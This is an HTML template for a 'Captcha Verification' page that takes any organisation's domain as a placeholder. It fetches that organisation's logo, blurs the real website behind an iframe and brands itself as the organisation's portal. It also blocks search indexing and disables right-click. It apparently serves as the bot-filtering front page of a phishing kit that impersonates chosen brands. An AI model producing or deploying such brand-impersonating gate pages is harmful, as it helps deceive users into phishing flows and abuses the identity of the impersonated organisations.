<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captcha Verification - {{ins}}</title>
  <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      font-family: 'Poppins', sans-serif;
      background: transparent;
      overflow: hidden;
    }

    iframe.background-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      border: none;
      filter: blur(6px) brightness(0.7);
    }

    .login-container {
      position: relative;
      max-width: 400px;
      margin: 10vh auto;
      background: #ffffffee;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .login-header {
      margin-bottom: 30px;
    }

    .login-header img {
      width: 60px;
      height: 60px;
      object-fit: contain;
      margin-bottom: 10px;
    }

    .login-header h1 {
      font-size: 22px;
      color: #333;
    }

    .captcha-image {
      display: block;
      margin: 0 auto 20px;
      max-width: 100%;
      border: 2px dashed #e60000;
      padding: 8px;
      border-radius: 8px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    label {
      font-size: 15px;
      font-weight: 600;
      color: #444;
      text-align: left;
    }

    input[type="text"] {
      padding: 12px;
      font-size: 16px;
      border: 1.5px solid #ccc;
      border-radius: 6px;
      outline: none;
      transition: border-color 0.3s ease;
    }

    input[type="text"]:focus {
      border-color: #4a90e2;
    }

    button {
      background-color: #4a90e2;
      color: white;
      font-size: 16px;
      font-weight: 600;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #357ABD;
    }

    .error-message {
      margin-top: 15px;
      font-size: 14px;
      color: #e74c3c;
    }

    .privacy-note {
      margin-top: 30px;
      font-size: 12px;
      color: #777;
      text-align: center;
    }
  </style>
</head>

<body oncontextmenu="return false;">
  <iframe src="https://www.{{ins}}" class="background-frame"></iframe>

  <div class="login-container">
    <div class="login-header">
      <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Logo">
      <h1>Captcha Verification</h1>
    </div>

    <form method="POST" action="/">
      <!-- CAPTCHA Image -->
      <img class="captcha-image" src="data:image/png;base64,{{ captcha_image }}" alt="CAPTCHA Image" />

      <label for="code">Enter the code shown:</label>
      <input type="text" id="code" name="code" required placeholder="Enter Captcha">

      <button type="submit">Verify</button>

      {% if error %}
        <div class="error-message">{{ message }}</div>
      {% endif %}
    </form>

    <div class="privacy-note">
      Â© {{ins}} Portal | Privacy Policy
    </div>
  </div>

</body>

</html>
